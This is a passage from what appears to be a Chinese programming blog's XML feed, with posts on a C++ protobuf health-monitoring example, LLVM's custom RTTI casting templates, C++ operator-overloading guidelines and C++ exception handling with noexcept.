class="number">0</span>; index &lt; healthMonitoringTable.<span class="built_in">people_size</span>(); ++index) &#123;</span><br><span class="line">        <span class="keyword">const</span> SchoolOfComputerScience::Person &amp;people = healthMonitoringTable.<span class="built_in">people</span>(index);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;------------------ people &quot;</span> &lt;&lt; index &lt;&lt; <span class="string">&quot; ------------------\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (people.<span class="built_in">has_name</span>())</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; people.<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (people.<span class="built_in">has_studentid</span>())</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;student ID: &quot;</span> &lt;&lt; people.<span class="built_in">studentid</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (people.<span class="built_in">has_phonenumber</span>())</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;phone number: &quot;</span> &lt;&lt; people.<span class="built_in">phonenumber</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">if</span> (people.<span class="built_in">has_healthcondition</span>()) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;health condition: \n&quot;</span>;</span><br><span class="line">            <span class="keyword">const</span> SchoolOfComputerScience::Person_HealthCondition &amp;healthCond = people.<span class="built_in">healthcondition</span>();</span><br><span class="line">            <span class="keyword">if</span> (healthCond.<span class="built_in">has_healthcode</span>())</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;                 health code color: &quot;</span> &lt;&lt; healthCond.<span class="built_in">healthcode</span>() &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">int</span> i = healthCond.<span class="built_in">routes_size</span>();</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;                 routes: &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; healthCond.<span class="built_in">routes_size</span>(); ++j) &#123;</span><br><span class="line">                cout &lt;&lt; healthCond.<span class="built_in">routes</span>(j) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cout &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (healthCond.<span class="built_in">has_temperature</span>())</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;                 temperature: &quot;</span> &lt;&lt; healthCond.<span class="built_in">temperature</span>() &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addHealthConditionItem</span><span class="params">(SchoolOfComputerScience::HealthMonitoringTable &amp;healthMonitoringTable)</span> </span>&#123;</span><br><span class="line">    SchoolOfComputerScience::Person *person = healthMonitoringTable.<span class="built_in">add_people</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 姓名</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter name: &quot;</span>;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="built_in">getline</span>(cin, *person-&gt;<span class="built_in">mutable_name</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 学号</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter studentID: &quot;</span>;</span><br><span class="line">    <span class="keyword">int64_t</span> studentID;</span><br><span class="line">    cin &gt;&gt; studentID;</span><br><span class="line">    person-&gt;<span class="built_in">set_studentid</span>(studentID);</span><br><span class="line">    cin.<span class="built_in">ignore</span>(<span class="number">256</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.手机号</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter phone number: &quot;</span>;</span><br><span class="line">    <span class="keyword">int64_t</span> phoneNumber;</span><br><span class="line">    cin &gt;&gt; phoneNumber;</span><br><span class="line">    person-&gt;<span class="built_in">set_phonenumber</span>(phoneNumber);</span><br><span class="line">    cin.<span class="built_in">ignore</span>(<span class="number">256</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.健康状态项</span></span><br><span class="line">    SchoolOfComputerScience::Person_HealthCondition *healthCondition = person-&gt;<span class="built_in">mutable_healthcondition</span>();</span><br><span class="line">    <span class="comment">// 输入健康码，如果不输入正确的则默认为红码</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Is your health code color green, yellow or red? &quot;</span>;</span><br><span class="line">    string healthCode;</span><br><span class="line">    <span class="built_in">getline</span>(cin, healthCode);</span><br><span class="line">    <span class="keyword">if</span> (healthCode == <span class="string">&quot;green&quot;</span>) &#123;</span><br><span class="line">        healthCondition-&gt;<span class="built_in">set_healthcode</span>(SchoolOfComputerScience::Person::HealthCondition::GREEN);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (healthCode == <span class="string">&quot;yellow&quot;</span>) &#123;</span><br><span class="line">        healthCondition-&gt;<span class="built_in">set_healthcode</span>(SchoolOfComputerScience::Person::HealthCondition::YELLOW);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (healthCode == <span class="string">&quot;red&quot;</span>) &#123;</span><br><span class="line">        healthCondition-&gt;<span class="built_in">set_healthcode</span>(SchoolOfComputerScience::Person::HealthCondition::RED);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Unknown color type.  Using default.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输入行程记录，用set</span></span><br><span class="line">    set&lt;string&gt; routes;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Enter a trip route (or leave blank to finish): &quot;</span>;</span><br><span class="line">        string route;</span><br><span class="line">        <span class="built_in">getline</span>(cin, route);</span><br><span class="line">        <span class="keyword">if</span> (route.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        routes.<span class="built_in">insert</span>(route);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> string &amp;route: routes) &#123;</span><br><span class="line">        healthCondition-&gt;<span class="built_in">add_routes</span>(route);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输入温度</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter your temperature: &quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">float</span> temperature;</span><br><span class="line">    cin &gt;&gt; temperature;</span><br><span class="line">    healthCondition-&gt;<span class="built_in">set_temperature</span>(temperature);</span><br><span class="line">    cin.<span class="built_in">ignore</span>(<span class="number">256</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Verify that the version of the library that we linked against is</span></span><br><span class="line">    <span class="comment">// compatible with the version of the headers we compiled against.</span></span><br><span class="line">    GOOGLE_PROTOBUF_VERIFY_VERSION;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;Usage:  &quot;</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; HEALTH_MONITORING_FILE&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SchoolOfComputerScience::HealthMonitoringTable healthMonitoringTable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the existing health monitoring table</span></span><br><span class="line">    <span class="function">fstream <span class="title">input</span><span class="params">(argv[<span class="number">1</span>], ios::in | ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!input) &#123;</span><br><span class="line">        cout &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; <span class="string">&quot;: File not found. Creating a new one. &quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!healthMonitoringTable.<span class="built_in">ParseFromIstream</span>(&amp;input)) &#123;   <span class="comment">// 首先从输入文件中将原本的健康检测表导入到程序</span></span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;Failed to parse health monitoring table.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在健康检测表中添加健康信息</span></span><br><span class="line">    <span class="built_in">addHealthConditionItem</span>(healthMonitoringTable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印当前健康检测表中所有的信息</span></span><br><span class="line">    <span class="built_in">dumpInfo</span>(healthMonitoringTable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将更新后的健康检测表写入文件</span></span><br><span class="line">    <span class="function">fstream <span class="title">output</span><span class="params">(argv[<span class="number">1</span>], ios::out | ios::trunc | ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!healthMonitoringTable.<span class="built_in">SerializeToOstream</span>(&amp;output)) &#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;Failed to write address book.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Optional:  Delete all global objects allocated by libprotobuf.</span></span><br><span class="line">    google::protobuf::<span class="built_in">ShutdownProtobufLibrary</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMake </tag>
            
            <tag> protobuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM RTTI</title>
      <link href="/2022/01/25/llvm-rtti/"/>
      <url>/2022/01/25/llvm-rtti/</url>
      
        <content type="html"><![CDATA[<h1 id="重要的编程接口"><a href="#重要的编程接口" class="headerlink" title="重要的编程接口"></a>重要的编程接口</h1><p>LLVM 是一个代码体量很大的框架，当基于 LLVM 框架进行开发时，有很多重要的 API 和编程准则需要去把握，以使得我们的程序更加高效。</p><h2 id="自定义-RTTI-实现"><a href="#自定义-RTTI-实现" class="headerlink" title="自定义 RTTI 实现"></a>自定义 RTTI 实现</h2><p>在 C++ 中， RTTI 主要是通过 <code>dynamic_cast</code> 运算符实现，该运算符会给编译器生成的代码带来一定的额外开销，而且其仅仅支持带虚表的类。所以在 LLVM 中，C++ 内置的 RTTI 机制默认是<strong>关闭</strong>的，而为了替代其功能，自定义了一套接口，来实现 RTTI 的功能，该套接口被定义在 <em>llvm/Support/Casting.h</em> 头文件中。下面则一一介绍这些接口：</p><ul><li><p><code>isa&lt;&gt;</code> ：类似于 JAVA中的 “instanceof” 操作符。<strong>它用来判定一个引用或指针实际指向的对象是否是所指定的 class 对象</strong>。</p></li><li><p><code>cast&lt;&gt;</code> ：执行 “checked cast” 操作。<strong>它将一个指针或引用从基类转换到继承类，如果指针或引用实际指向的对象不是所指定的类型，则触发断言错误</strong>。这个操作符一般在你完全确定指针或引用实际指向的对象的类型时使用。示例如下：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">isLoopInvariant</span><span class="params">(<span class="keyword">const</span> Value *V, <span class="keyword">const</span> Loop *L)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Value must be loop invariant if it&#x27;s an instance of Contant|Argument|Globalvalue</span></span><br><span class="line"> <span class="keyword">if</span> (isa&lt;Constant&gt;(V) || isa&lt;Argument&gt;(V) || isa&lt;GlobalValue&gt;(V))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Otherwise, it must be an instruction...</span></span><br><span class="line"><span class="keyword">return</span> !L-&gt;<span class="built_in">contains</span>(cast&lt;Instruction&gt;(V)-&gt;<span class="built_in">getParent</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>dyn_cast&lt;&gt;</code> ：执行 “checking cast” 操作。<strong>它检查操作数是否属于指定类型，如果是，则返回指向该操作数的指定类型指针（该操作符不能用于引用）</strong>。如果操作数的类型不正确，则返回空指针。因此，<code>dyn_cast&lt;&gt;</code> 操作符所发挥的作用特别类似于 C++ 中的 <strong>dynamic_cast</strong> 操作符，所以一般也用于与其相同的场景。<code>dyn_cast&lt;&gt;</code> 最常用的示例：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">execution</span><span class="params">(<span class="keyword">const</span> Instruction *Val)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">const</span> Instruction *AI = dyn_cast&lt;AllocaInst&gt;(Val)) &#123;</span><br><span class="line">       <span class="comment">// ...</span></span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">const</span> Instruction *SI = dyn_cast&lt;StoreInst&gt;(Val)) &#123;</span><br><span class="line">       <span class="comment">// ...</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>【注】：<code>cast&lt;&gt;</code> 作为一个 “checked cast” 操作，在使用前必须确保类型正确（否则报断言），但是一般不会在 <code>isa&lt;&gt;</code> 操作确认类型后使用 <code>cast&lt;&gt;</code>，如果有这样的需求，一般直接使用 <code>dyn_cast&lt;&gt;</code> 操作符。<code>dyn_cast&lt;&gt;</code> 操作符类似于 C++ 的 <code>dynamic_cast&lt;&gt;</code> 操作符和 JAVA 的 <code>instanceof</code> 操作符，很可能被滥用。特别是，我们不应该使用一长串的 if/then/else 链块来检查类的很多不同的变体。如果想这样做，使用 InstVisitor 类直接分派指令类型会更干净、更有效。</p></blockquote></li><li><p><code>isa_and_nonnull&lt;&gt;</code>：类似于 <code>isa&lt;&gt;</code> 操作符，不过该操作符允许空指针作为参数（返回 false）。</p></li><li><p><code>cast_or_null&lt;&gt;</code>：类似于 <code>cast&lt;&gt;</code>  操作符，不过该操作符允许空指针作为参数（继续传递下去）。 </p></li><li><p><code>dyn_cast_or_null&lt;&gt;</code>：类似于 <code>dyn_cast&lt;&gt;</code> 操作符，不过该操作符允许将空指针作为参数（继续传递下去）。</p></li></ul><p><strong>这些 LLVM-style 的自定义 RTTI 模板的做大特点是，都可以用于任何的类，而不管这些类是否定义了虚函数</strong>。</p><h2 id="为什么要使用-LLVM-RTTI？"><a href="#为什么要使用-LLVM-RTTI？" class="headerlink" title="为什么要使用 LLVM RTTI？"></a>为什么要使用 LLVM RTTI？</h2>]]></content>
      
      
      <categories>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 运算符重载注意项</title>
      <link href="/2021/11/21/cpp-operator-overload/"/>
      <url>/2021/11/21/cpp-operator-overload/</url>
      
        <content type="html"><![CDATA[<p>在设计类的时候，通常要考虑这个类将提供哪些操作，也就是运算符重载，而运算符重载有一系列的准则，这节博文就阐述在设计类的过程，对运算符重载时候的一些思考和建议。</p><h2 id="不该重载的运算符"><a href="#不该重载的运算符" class="headerlink" title="不该重载的运算符"></a>不该重载的运算符</h2><blockquote><p>通常情况下，不应该重载逗号、取地址、逻辑与和逻辑或运算符。</p></blockquote><p><strong>为什么不重载逗号和取地址运算符？</strong></p><p>因为 C++ 语言已经定义了这两种运算符用于类类型对象时的特殊含义，所以一般来说它们不应该被重载，否则它们的行为会异于常态。</p><p><strong>为什么不重载逻辑与（&amp;&amp;）和逻辑或（||）运算符？</strong></p><p>因为运算符重载实际上是一次函数调用，用户无法实现 &amp;&amp; 和 || 的短路特性。</p><p>&amp;&amp; 短路特性：A &amp;&amp; B，如果 A 为假，则 B 不会被执行。</p><p>|| 短路特性：A || B，如果 A 为真，则 B 不会被执行。</p><hr><h2 id="成员函数还是非成员函数"><a href="#成员函数还是非成员函数" class="headerlink" title="成员函数还是非成员函数"></a>成员函数还是非成员函数</h2><p>当我们决定定义一个重载运算符的时候，通常应该决定是将其声明为类的成员函数还是普通的非成员函数。</p><ul><li>赋值（=）、下标（[ ]）、调用（ () ）和成员访问箭头（-&gt;）运算符<strong>必须是成员</strong>。</li><li>复合赋值运算符一般来说应该是成员。</li><li>改变对象状态的运算符或者与给定类型密切相关的运算符，如递增、递减和解引用运算符，一般应该是成员。</li><li>具有<strong>对称性</strong>的运算符如算术、相等性、关系和位运算符等，一般应该是非成员函数。</li><li>输入输出运算符必须是非成员函数。</li></ul><p>至于为什么要这么做后续再做探讨。</p><hr><h2 id="具体运算符的重载"><a href="#具体运算符的重载" class="headerlink" title="具体运算符的重载"></a>具体运算符的重载</h2><h3 id="输入输出运算符"><a href="#输入输出运算符" class="headerlink" title="输入输出运算符"></a>输入输出运算符</h3><p><strong>为什么输入和输出运算符必须是非成员函数？</strong></p><p>因为输入输出运算符的重载第一个参数一定是流对象，所以不能作为类的成员函数。</p><p><strong>输出运算符应该尽量减少格式化操作。</strong>因为这种格式化操作应该留给用户，比如说换行，这样可以给用户更大的施展空间。</p><p><strong>输入运算符的重载要注意在实现的时候处理输入错误！！</strong></p><h3 id="算术和关系运算符"><a href="#算术和关系运算符" class="headerlink" title="算术和关系运算符"></a>算术和关系运算符</h3><p><strong>为什么算术和关系运算符一般是非成员函数？</strong></p><p>因为算术和关系运算符都是二目运算符，其左右两边都必须是同样的类对象，具有对称性，定义成非成员函数以允许左侧或右侧的运算对象进行转换。</p><p><strong>算术运算符。</strong>定义算术运算符（声明为非成员函数）的时候，通常也应该定义相关的复合赋值运算符（声明为成员函数），且用复合赋值运算符来实现对应的算术运算符。</p><p><strong>相等运算符</strong>。如果一个类定义了 operator==，通常也应该定义 operator !=，且其中的一个应该把工作委托给另外一个。反之亦然。</p><p><strong>关系运算符。</strong>如果存在唯一一种逻辑可靠的 &lt; 定义，则应该考虑为这个类定义 &lt; 运算符，否则还是不定义了吧。</p><blockquote><p>在定义类的关系运算符的时候，一定要遵循逻辑可靠性，不要产生二义性。比如说 &lt; 为真，则 == 肯定得为假，!= 肯定为真。</p></blockquote><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p><strong>为什么赋值运算符重载必须是成员函数？</strong></p><p>因为如果不定义为成员函数，在需要使用的时候，编译器会合成一个默认的版本，也就是说，如果定义为非成员函数，将永远无法发挥作用，因为在使用赋值运算符的时候，会使用编译器合成的默认版本。</p><blockquote><p>我们可以重载赋值运算符，不论其形参的类型是什么，赋值运算符都<strong>必须</strong>定义为成员函数。</p></blockquote><h3 id="下标运算符"><a href="#下标运算符" class="headerlink" title="下标运算符"></a>下标运算符</h3><p><strong>为什么下标运算符重载必须是成员函数？</strong></p><p>因为和对象有<strong>相关性</strong>，可以认为是<strong>读写对象的属性</strong>，所以规定必须实现为非静态的成员函数。调用运算符和成员访问箭头也是同理。</p><blockquote><p>如果一个类包含下标运算符，则通常会定义两个版本：一个返回普通引用，另一个是类的常量成员并且返回返回常量引用。</p></blockquote><h3 id="递增和递减运算符"><a href="#递增和递减运算符" class="headerlink" title="递增和递减运算符"></a>递增和递减运算符</h3><p>要想定义递增递减运算符的前置和后置运算符，首先应该解决一种情况，即普通的重载形式无法区分这两种情况。为了解决这个问题，后置版本接受一个<strong>额外的不被使用的 int 类型的形参。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不定义 const 版本，因为需要改变对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StrBlobPtr</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 前置的递增递减运算符重载</span></span><br><span class="line">    StrBlobPtr &amp;<span class="keyword">operator</span>++();</span><br><span class="line">    StrBlobPtr &amp;<span class="keyword">operator</span>--();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后置的递增递减运算符重载</span></span><br><span class="line">    StrBlobPtr <span class="keyword">operator</span>++(<span class="keyword">int</span>);</span><br><span class="line">    StrBlobPtr <span class="keyword">operator</span>--(<span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>重载运算符实际上是一个函数，那么如何显示的调用前置和后置递增递减运算符呢？</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.<span class="keyword">operator</span>++(<span class="number">0</span>);<span class="comment">// 调用后置版本的 operator++</span></span><br><span class="line">p.<span class="keyword">operator</span>++();<span class="comment">// 调用前置版本的 operator++</span></span><br></pre></td></tr></table></figure><h3 id="成员访问运算符"><a href="#成员访问运算符" class="headerlink" title="成员访问运算符"></a>成员访问运算符</h3><p>箭头运算符必须是类的成员，解引用运算符通常也是。</p><p>重载的箭头运算符必须返回类的指针或自定义了箭头运算符的某个类的对象。</p><h3 id="函数调用运算符"><a href="#函数调用运算符" class="headerlink" title="函数调用运算符"></a>函数调用运算符</h3><p>函数调用符必须是类的成员。如果类定义了调用运算符，则该类的对象称为<strong>函数对象</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 异常处理</title>
      <link href="/2021/11/07/cpp-exception/"/>
      <url>/2021/11/07/cpp-exception/</url>
      
        <content type="html"><![CDATA[<h1 id="异常处理要点"><a href="#异常处理要点" class="headerlink" title="异常处理要点"></a>异常处理要点</h1><ul><li><p><strong>栈展开</strong>：在 throw 出一个异常后，通过栈展开寻找最匹配的 catch 子句。如果没有找到的话，则调用标准库函数 terminate 终止程序的执行过程；如果找到了的话，则执行 catch 子句块后，找到与 try 块关联的最后一个 catch 子句后的点，从这里继续执行。栈展开的过程中，局部对象被自动销毁，而通过 new 向堆空间申请的内存则仍然需要用户自己来进行销毁。</p></li><li><p><strong>析构函数不应该抛出异常</strong>：由于在栈展开的过程中可能使用到析构函数，所以析构函数不应该抛出不能被它自身处理的异常。也就是说，若析构函数需要执行某个可能抛出异常的操作，则该操作应该被放置在一个 try 语句块中，并且在析构函数内部得到处理。</p></li><li><p><strong>异常表达式的类型</strong>：当我们抛出一条表达式的时候，该表达式静态编译时类型决定了异常对象的类型。</p></li><li><p><strong>异常的重新抛出</strong>：通过在 catch 语句或 catch 语句直接或间接调用的函数之内用一个 <code>throw;</code> 语句可以将异常重新抛出，其将当前的异常对象沿着调用链向上传递。若在处理代码之外的区域遇到了空 throw 语句，编译器将调用 terminate。</p></li><li><p><strong>函数 try 语句块</strong>：使得一组 catch 语句既能处理构造函数体（或析构函数体），也能处理构造函数的初始化过程（或析构函数的析构过程）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">Blob&lt;T&gt;::<span class="built_in">Blob</span>(std::initializer_list&lt;T&gt; il) <span class="keyword">try</span> : <span class="built_in">data</span> (std::make_shared&lt;std::vector&lt;T&gt;&gt; (il)) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span>(<span class="keyword">const</span> std::bad_alloc &amp;e) &#123; <span class="built_in">handle_out_of_memory</span>(e); &#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="C-11-标准中的-noexcept"><a href="#C-11-标准中的-noexcept" class="headerlink" title="C++11 标准中的 noexcept"></a>C++11 标准中的 noexcept</h1><p>C++ 中的异常处理是在运行时而不是编译时检测的。为了实现运行时检测，编译器创建额外的代码，然而这会妨碍程序优化。该关键字告诉编译器，函数中不会发生异常，这有利于编译器对程序做更多的优化。如果在运行时，noexecpt 函数向外抛出了异常（如果函数内部捕捉了异常并完成处理，这种情况不算抛出异常），程序会直接终止，调用 std::terminate() 函数，该函数内部会调用 std::abort() 终止程序。</p><p>从 C++11 开始，我们能看到很多代码当中都有关键字 noexcept。比如下面就是 std::initializer_list 的默认构造函数，其中使用了 noexcept。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="title">initializer_list</span><span class="params">()</span> <span class="keyword">noexcept</span></span></span><br><span class="line"><span class="function">: _M_array(<span class="number">0</span>), _M_len(<span class="number">0</span>) &#123;</span> &#125;</span><br></pre></td></tr></table></figure><p><strong>有条件的noexcecpt</strong></p><p>单独使用 noexcept 的时候，表示其所限定的函数绝对不发生异常，然而其使用方式可以更加灵活，表示在一定条件下不会发生异常。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果操作x.swap(y)不发生异常，那么函数swap(Type&amp; x, Type&amp; y)一定不发生异常</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(Type&amp; x, Type&amp; y)</span> <span class="title">noexcept</span><span class="params">(<span class="keyword">noexcept</span>(x.swap(y)))</span>    <span class="comment">//C++11</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x.<span class="built_in">swap</span>(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个更好的示例是 std::pair 中的移动分配函数（move assignment），它表明，如果类型 T1 和 T2 的移动分配（move assign）过程中不发生异常，那么该移动构造函数就不会发生异常。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pair&amp; <span class="keyword">operator</span>=(pair&amp;&amp; __p)</span><br><span class="line">    <span class="built_in"><span class="keyword">noexcept</span></span>(__and_&lt;is_nothrow_move_assignable&lt;_T1&gt;,</span><br><span class="line">             is_nothrow_move_assignable&lt;_T2&gt;&gt;::value)</span><br><span class="line">&#123;</span><br><span class="line">    first = std::forward&lt;first_type&gt;(__p.first);</span><br><span class="line">    second = std::forward&lt;second_type&gt;(__p.second);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 noexcept 表明函数或操作不会发生异常，会给编译器更大的优化空间。然而，并不是加上 noexcept 就能提高效率，步子迈大了也容易扯着蛋。<br>以下情形鼓励使用 noexcept：</p><ul><li>移动构造函数（move constructor）</li><li>移动分配函数（move assignment）</li><li>析构函数（destructor）。这里提一句，在新版本的编译器中，析构函数是默认加上关键字 noexcept 的。</li><li>叶子函数（Leaf Function）。叶子函数是指在函数内部不分配栈空间，也不调用其它函数，也不存储非易失性寄存器，也不处理异常。</li></ul><p><strong>最后强调一句，在不是以上情况或者没把握的情况下，不要轻易使用 noexcept。</strong></p><hr><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p><a href="https://www.cnblogs.com/sword03/p/10020344.html">https://www.cnblogs.com/sword03/p/10020344.html</a><br>《C++ prime》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ 中异常机制的实现机制详解（转载）</title>
      <link href="/2021/11/06/cpp-exception-impl/"/>
      <url>/2021/11/06/cpp-exception-impl/</url>
      
